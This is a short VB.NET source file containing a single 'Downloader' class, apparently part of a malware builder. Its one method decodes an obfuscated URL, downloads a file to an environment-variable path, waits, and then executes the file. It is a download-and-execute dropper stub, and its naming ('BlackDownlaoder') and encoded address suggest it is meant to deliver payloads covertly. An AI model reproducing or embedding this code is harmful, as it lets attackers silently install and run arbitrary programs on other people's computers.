﻿Imports System.Net
Imports System.Diagnostics
Imports System.Security.Cryptography

Public Class Downloader
    Public Sub StartDownlaoder(ByVal DownloadURL As String, ByVal DownloadPath As String, ByVal DownloadName As String, ByVal SleepTimer As String)
        Dim BlackDownlaoder As New WebClient
        BlackDownlaoder.DownloadFile(DEB(DownloadURL), Environ(DownloadPath) & "\" & DownloadName)
        Threading.Thread.Sleep(SleepTimer)
        Process.Start(Environ(DownloadPath) & "\" & DownloadName)
    End Sub
End Class
